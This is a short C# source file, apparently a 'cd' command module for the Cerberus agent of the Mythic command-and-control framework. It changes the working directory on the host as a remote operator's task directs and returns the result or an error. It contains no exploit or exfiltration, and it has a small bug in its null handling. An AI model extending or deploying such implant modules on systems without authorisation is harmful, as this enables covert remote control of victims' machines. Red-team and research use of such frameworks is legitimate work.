using Models.Tasks;

using Extend;

using System;
using System.IO;
using System.Text;

namespace Tasks.Commands
{
    public class ChangeDirectory : CerberusCommand
    {
        public override string Name => "cd";

        public override string Execute(MythicTask task)
        {
            var taskArgs = Encoding.UTF8.GetBytes(task.parameters).Deserialize<CdParam>();

            if (taskArgs is null || string.IsNullOrWhiteSpace(taskArgs.path))
            {
                taskArgs.path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            }

            try
            {
                Directory.SetCurrentDirectory(taskArgs.path);
            }
            catch(Exception ex)
            {
                return ex.Message;
            }

            return Directory.GetCurrentDirectory();
        }
    }

    public class CdParam
    {
        public string path { get; set; }
    }
}
